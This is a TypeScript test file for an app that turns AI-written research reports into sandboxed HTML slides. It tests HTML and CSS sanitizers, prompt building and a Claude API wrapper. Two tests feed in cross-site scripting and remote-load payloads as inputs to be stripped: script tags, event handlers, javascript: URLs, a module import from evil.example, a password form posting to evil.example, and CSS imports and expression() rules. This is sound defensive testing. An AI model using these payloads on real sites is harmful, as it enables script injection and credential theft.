import test from 'node:test';
import assert from 'node:assert/strict';
import { readFileSync } from 'node:fs';
import { callClaudeMessages } from '../cloudflare/heavy-api/src/claude-text.ts';
import { AGENT_REPORT_MAX_CHARS, AGENT_REPORT_MAX_TOKENS, AGENT_REPORT_SYSTEM_PROMPT, formatAgentResearchContent } from '../cloudflare/heavy-api/src/designAssistant.ts';
import {
  AGENT_REPORT_CSP, agentReportLooksRight, agentReportPrompt, agentReportRound, agentReportSources, buildAgentAiReportHtml, sanitizeAgentCss, sanitizeAgentReportHtml,
} from '../src/features/agent/agentReport.ts';
import { AGENT_PROMPT_BUDGET, buildAgentResearchReportHtml, type AgentTask } from '../src/features/agent/agentFlow.ts';

// Light's research report (「オンラインで表示」, read 2026-11-12 from its 新商品企画 5ce6e3ac… and 顧客提案 02b36ab0…) is
// written by its AI each time: 1600x900 slides (10 and 12 pages), evidence cards with 「ソースを見る」, one page per direction,
// a comparison table and the source table on the last page (新商品企画 「ソース索引」 # / ソース / 種別 / 収集・公開時期 /
// 用途, 顧客提案 「ソース一覧」 ID / ソース / 内容 / 区分). Heavy's report was one fixed layout (buildAgentResearchReportHtml).
// Heavy now asks the server's Claude for the slides and shows only safe markup from them, or the fixed report.

const sources = [
  { title: 'ZOZOTOWN ワンピースランキング', url: 'https://zozo.jp/ranking/category/onepiece/', quote: 'ティアードワンピース ¥7,499' },
  { title: 'WWD 2027春夏', url: 'https://www.wwdjapan.com/articles/1', quote: 'ドレープが春夏の主役になる' },
];
const researchContent = formatAgentResearchContent({ text: '## 市場と気候\n- 通勤服は洗えることが支持される\n## トレンド\n- ドレープ', sources, searchUsed: true, searchErrors: [] });
const themes = ['フェミニン・テーラード（ジャケット）｜柔らかな装飾｜通勤×華やぎ｜jacket', 'イージーケア通勤（シャツ）｜洗える｜タイパ｜shirt',
  'ロマンチック（ワンピース）｜ティアード｜社交映え｜dress', 'ドレープ・ニュートラル（スカート）｜落ち感｜+129%｜skirt'];
const task = (extra: Partial<AgentTask> = {}): AgentTask => ({
  kind: 'heavy-agent-task', version: 1, scene: '顧客提案', subtype: '顧客提案', flow: 'conversation', prompt: '28〜40歳の女性へ、手の届くラグジュアリーの2027年春夏レディースコレクション提案', profile: '', project: null,
  createdAt: '2026-11-12T00:00:00.000Z', choice: null, plan: null, image: null, notes: [],
  requirements: { requestId: 'q', state: 'completed', content: '[要件]\nシリーズ名：2027SSレディースコレクション\nR01 ブランドの位置づけ：手の届くラグジュアリー\n[補足が必要]\n①価格帯' },
  aligned: { at: '2026-11-12T00:01:00.000Z' }, scope: { regions: ['日本'], ec: ['ZOZOTOWN'], sns: ['Instagram'], other: '', at: '2026-11-12T00:02:00.000Z' },
  research: { requestId: 'r', state: 'completed', content: researchContent },
  rounds: [{ step: { requestId: 'round-1', state: 'completed', content: 'x' }, summary: '', themes }],
  ...extra,
});
const page = (n: number, inner: string) => `<section class="report-page" data-page-id="page-${n}"><header class="page-header"><h2>ページ${n}</h2><span class="kicker">Page</span></header><div class="page-body">${inner}</div><footer class="page-footer"><span>2027SSレディースコレクション提案 — 調査・方向性レポート</span><span>${String(n).padStart(2, '0')}</span></footer></section>`;
const slides = (inner = '') => `<style>:root{--color-accent:#7A303B}.x{color:red}</style><main class="report">${[1, 2, 3, 4].map(n => page(n, `<div class="card"><p>${'所見'.repeat(200)}</p></div>`)).join('')}`
  + page(5, `<figure class="media-item"><a class="media-frame media-link" href="https://zozo.jp/ranking/category/onepiece/" target="_blank" aria-label="ソースを見る"><span class="media-empty">zozo.jp</span></a><figcaption><b>ティアードワンピース</b> ¥7,499</figcaption></figure>${inner}`)
  + page(6, '<table><tr><th>ID</th><th>ソース</th><th>内容</th><th>区分</th></tr><tr><td>S01</td><td>zozo.jp(ranking)</td><td>D03根拠</td><td>EC実商品(収集 2026-11-12)</td></tr></table><h3>ソース一覧</h3>') + '</main>';

test('the slides keep layout markup and the research\'s own links; scripts, events, loads and other links are dropped', () => {
  const allowed = sources.map(source => source.url);
  const dirty = [
    '<!doctype html><html><head><base href="https://evil.example/"><meta http-equiv="refresh" content="0;url=https://evil.example"><link rel="stylesheet" href="https://evil.example/a.css"><title>t</title><style>.a{color:red}</style></head><body>',
    '<SCRIPT>alert(1)</SCRIPT><script type="module">import "https://evil.example/x.js"</script >',
    '<div class="card" onclick="alert(1)" onmouseover=alert(2) style="color:red;background:url(https://evil.example/t.png)">本文 &amp; 文 <b>太字</b></div>',
    '<img src="https://evil.example/p.png" onerror="alert(3)"><iframe src="https://evil.example"></iframe><svg><script>alert(4)</script><a href="javascript:alert(5)">x</a></svg>',
    '<object data="x"><embed src="y"></object><form action="https://evil.example"><input name="pw"><button>送る</button></form><video src="z"></video>',
    '<a href="javascript:alert(6)">危ない</a><a href="jav&#x61;script&colon;alert(7)">符号化</a><a href="https://evil.example/phish" target="_blank">外</a>',
    '<a href="https://zozo.jp/ranking/category/onepiece/" target="_self" rel="opener">ソースを見る</a>',
    '<scr<script>ipt>alert(8)</script><!-- <script>alert(9)</script> --><p data-page-id="page-01" class="a <b> c">開いたまま',
    '<table><tr><td colspan="2" rowspan="javascript">セル</td></tr></table>1 < 2',
    '</body></html>',
  ].join('');
  const { style, body } = sanitizeAgentReportHtml(dirty, allowed);
  assert.doesNotMatch(body, /<script|<img|<iframe|<svg|<object|<embed|<form|<input|<button|<video|<base|<meta|<link|<title|<style|<html|<body/i);
  assert.doesNotMatch(body, /\bon[a-z]+=|javascript|evil\.example|url\(/i);
  assert.match(body, /<div class="card" style="color:red">本文 &amp; 文 <b>太字<\/b><\/div>/);
  // The research's page stays a link, always to a new tab without the opener or referrer; others become plain text.
  assert.match(body, /<a href="https:\/\/zozo\.jp\/ranking\/category\/onepiece\/" target="_blank" rel="noopener noreferrer">ソースを見る<\/a>/);
  assert.match(body, /<a>危ない<\/a><a>符号化<\/a><a>外<\/a>/);
  assert.match(body, /<p data-page-id="page-01" class="a b c">開いたまま/);
  assert.match(body, /<td colspan="2">セル<\/td>/);
  assert.match(body, /1 &lt; 2/);
  // Tags left open are closed, so the slides cannot swallow what the app adds after them.
  assert.match(body, /<\/p>$/);
  assert.equal(style, '.a{color:red}');
});

test('the CSS keeps the palette and rules and loses every way to load or escape', () => {
  const css = sanitizeAgentCss([
    '@import url("https://evil.example/a.css"); @charset "utf-8";',
    ':root{--color-accent:#7A303B;--page-bg:#E7DED8}',
    '.a{color:red;background:url(https://evil.example/t.png);width:10px}',
    '.b{background-image:image-set("x.png" 1x);content:"\\75 rl(x)"}',
    '.c{behavior:url(x.htc);width:expression(alert(1));-moz-binding:url(x)}',
    '@font-face{font-family:x;src:url(https://evil.example/f.woff)}',
    '/* comment </style><script>alert(1)</script> */ .d{color:blue}</style><script>alert(2)</script>',
    '.page-header > *{margin:0}',
  ].join('\n'));
  assert.doesNotMatch(css, /url\(|@import|@font-face|image-set|expression|behavior|binding|\\|<|script\b.*alert/i);
  assert.match(css, /:root\{--color-accent:#7A303B;--page-bg:#E7DED8\}/);
  assert.match(css, /\.a\{color:red;;width:10px\}/);
  assert.match(css, /\.d\{color:blue\}/);
  assert.match(css, /\.page-header > \*\{margin:0\}/);
});

test('the report is the AI\'s slides only when written for the current directions and shaped like slides', () => {
  const written = (content: string, extra: Partial<AgentTask> = {}) => task({ report: { round: 'round-1', step: { requestId: 'p', state: 'completed', content } }, ...extra });
  const html = buildAgentAiReportHtml(written(slides('<script>alert(1)</script><img src=x onerror=alert(2)>')), '2027SSレディースコレクション 顧客要件調査・ビジュアル方向性レポート');
  assert.ok(html);
  assert.match(html!, /^<!doctype html><html lang="ja"><head><meta charset="utf-8"><meta http-equiv="Content-Security-Policy" content="default-src 'none'; style-src 'unsafe-inline'; img-src data:/);
  assert.match(html!, /<style>:root\{--color-accent:#7A303B\}\.x\{color:red\}<\/style><\/head><body><main class="report">/);
  assert.doesNotMatch(html!, /<script|onerror|<img/i);
  assert.equal(AGENT_REPORT_CSP.includes("default-src 'none'"), true);
  // A fence around the reply is not part of it.
  assert.ok(buildAgentAiReportHtml(written(`\`\`\`html\n${slides()}\n\`\`\``), 't'));
  // Not slides (too few pages, no source table), failed, still running, or written for older directions: the fixed report.
  assert.equal(buildAgentAiReportHtml(written('<main class="report"><p>短い</p></main>'), 't'), null);
  assert.equal(agentReportLooksRight(sanitizeAgentReportHtml(slides().replace(/ソース一覧/g, '一覧'), []).body), false);
  assert.equal(buildAgentAiReportHtml(task({ report: { round: 'round-1', step: { requestId: 'p', state: 'failed', errorCode: 'claude_output_truncated' } } }), 't'), null);
  assert.equal(buildAgentAiReportHtml(task({ report: { round: 'round-1', step: { requestId: 'p', state: 'running' } } }), 't'), null);
  assert.equal(buildAgentAiReportHtml(written(slides(), { rounds: [...task().rounds, { step: { requestId: 'round-2', state: 'completed', content: 'y' }, summary: '', themes }] }), 't'), null);
  assert.equal(buildAgentAiReportHtml(task(), 't'), null);
  // The fixed report is still there to fall back on.
  assert.match(buildAgentResearchReportHtml(task()), /ソース一覧/);
});

test('slides are asked for once the directions arrive, for 新商品企画 and 顧客提案 only', () => {
  assert.equal(agentReportRound(task()), 'round-1');
  assert.equal(agentReportRound(task({ rounds: [] })), null);
  assert.equal(agentReportRound(task({ rounds: [{ step: { requestId: 'round-1', state: 'running' }, summary: '', themes: [] }] })), null);
  // A failed retry does not hide the directions it follows; a running new round waits for its own directions.
  assert.equal(agentReportRound(task({ rounds: [...task().rounds, { step: { requestId: 'round-2', state: 'failed' }, summary: '', themes: [] }] })), 'round-1');
  assert.equal(agentReportRound(task({ rounds: [...task().rounds, { step: { requestId: 'round-2', state: 'running' }, summary: '', themes: [] }] })), null);
  assert.equal(agentReportRound(task({ research: { requestId: 'r', state: 'running' } })), null);
  // テーマ企画 has only 参考資料 (no report); the chat scenes have no report.
  assert.equal(agentReportRound(task({ flow: undefined, scene: '商品企画', subtype: 'テーマ企画' })), null);
  assert.equal(agentReportRound(task({ flow: 'dialogue', scene: 'インスピレーション', subtype: 'インスピレーション' })), null);
});

test('the request carries every fact the slides may use, the table Light uses for the scene, and stays under the cap', () => {
  const client = agentReportPrompt(task());
  assert.match(client, /S01 \| zozo\.jp \| EC \| ZOZOTOWN ワンピースランキング \| ティアードワンピース ¥7,499 \| https:\/\/zozo\.jp\/ranking\/category\/onepiece\//);
  assert.match(client, /S02 \| wwdjapan\.com \| ウェブ \|/);
  assert.match(client, /D01 フェミニン・テーラード（ジャケット）｜柔らかな装飾｜通勤×華やぎ/);
  assert.match(client, /D04 ドレープ・ニュートラル/);
  assert.match(client, /調査範囲: 日本、ZOZOTOWN、Instagram（収集日 2026-11-12）/);
  assert.match(client, /帯の文: 「2027SSレディースコレクション提案 — 調査・方向性レポート」/);
  assert.match(client, /題「ソース一覧」・kicker「Source Index」、表の列は ID \/ ソース \/ 内容 \/ 区分/);
  assert.match(client, /価格はページの文に書かれているときだけ書く/);
  assert.doesNotMatch(client, /\[補足が必要\]/);
  const product = agentReportPrompt(task({ scene: '商品企画', subtype: '新商品企画' }));
  assert.match(product, /D1 フェミニン・テーラード/);
  assert.match(product, /<h3>ソース索引<\/h3> の表（列は # \/ ソース \/ 種別 \/ 収集・公開時期 \/ 用途）/);
  assert.match(product, /用途は、その出典をレポートのどの所見・方向の根拠に使ったか/);
  const huge = task({ prompt: '依'.repeat(20000), research: { requestId: 'r', state: 'completed', content: formatAgentResearchContent({ text: `## a\n- ${'事'.repeat(30000)}`, sources: Array.from({ length: 20 }, (_, i) => ({ title: 't'.repeat(300), url: `https://s${i}.example/${'p'.repeat(200)}`, quote: 'q'.repeat(400) })), searchUsed: true, searchErrors: [] }) } });
  assert.equal(agentReportPrompt(huge).length <= AGENT_PROMPT_BUDGET, true);
  assert.equal(agentReportSources(huge).length, 15);
});

test('the server writes the slides with its own instructions, room for a whole deck, and refuses a cut-off reply', async () => {
  assert.match(AGENT_REPORT_SYSTEM_PROMPT, /one <style> element, then one <main class="report"> element/);
  assert.match(AGENT_REPORT_SYSTEM_PROMPT, /Never add figures, prices, brands, products, dates or sources that are not there\. Link only the URLs listed, exactly as written\./);
  assert.match(AGENT_REPORT_SYSTEM_PROMPT, /When the request lists real products \(P01…\)[^']*<img src="its image URL" alt="its name">[^']*Never add any other <img>\./);
  assert.equal(AGENT_REPORT_MAX_TOKENS >= 24000, true);
  assert.equal(AGENT_REPORT_MAX_CHARS > 65536, true);
  let sent: Record<string, unknown> = {};
  const env = { ANTHROPIC_API_KEY: 'server-only-test-key' } as any;
  const reply = (stop: string) => async (_url: unknown, init?: RequestInit) => { sent = JSON.parse(String(init?.body)); return Response.json({ stop_reason: stop, content: [{ type: 'text', text: '<main></main>' }], usage: { input_tokens: 10, output_tokens: 20 } }); };
  const result = await callClaudeMessages(env, { system: AGENT_REPORT_SYSTEM_PROMPT, messages: [{ role: 'user', content: 'x' }], maxTokens: AGENT_REPORT_MAX_TOKENS, effort: 'medium' }, reply('end_turn'));
  assert.equal(result.text, '<main></main>');
  assert.deepEqual(sent.output_config, { effort: 'medium' });
  assert.equal(sent.max_tokens, AGENT_REPORT_MAX_TOKENS);
  await assert.rejects(callClaudeMessages(env, { system: 's', messages: [{ role: 'user', content: 'x' }], effort: 'medium' }, reply('max_tokens')), /claude_output_truncated/);
  // The chat replies keep their old request (no effort) and their old handling.
  await callClaudeMessages(env, { system: 's', messages: [{ role: 'user', content: 'x' }] }, reply('end_turn'));
  assert.equal('output_config' in sent, false);
  const server = readFileSync(new URL('../cloudflare/heavy-api/src/designAssistant.ts', import.meta.url), 'utf8');
  assert.match(server, /const AGENT_MODES = new Set<unknown>\(\['agent', 'agent-research', 'agent-report'\]\)/);
  assert.match(server, /input\.mode === 'agent-report' \? AGENT_REPORT_MAX_CHARS : 65536/);
});

test('the task page asks for the slides beside the other steps and shows them in the sandboxed frame without scripts', () => {
  const view = readFileSync(new URL('../src/pages/HeavyAgentTaskPage.tsx', import.meta.url), 'utf8');
  assert.match(view, /runAssistant\('report', step, agentReportPrompt\(saved\.task\), applyReport, 'agent-report'\)/);
  assert.match(view, /buildAgentAiReportHtml\(task, [^)]*\);\n\s*return slides \? \{ html: slides, slides: true \} : buildAgentResearchReportHtml\(task\);/);
  // The report frame never allows scripts or same-origin access.
  for (const frame of view.match(/<iframe[^>]*>/g) ?? []) {
    assert.match(frame, /sandbox="allow-popups allow-popups-to-escape-sandbox"/);
    assert.doesNotMatch(frame, /allow-scripts|allow-same-origin/);
  }
  assert.match(view, /kind !== 'report' \? agentReferenceImages/);
  // Writing the slides never blocks the composer or the other steps.
  assert.doesNotMatch(view.slice(view.indexOf('const working ='), view.indexOf('const waitingOnUser')), /report/);
});
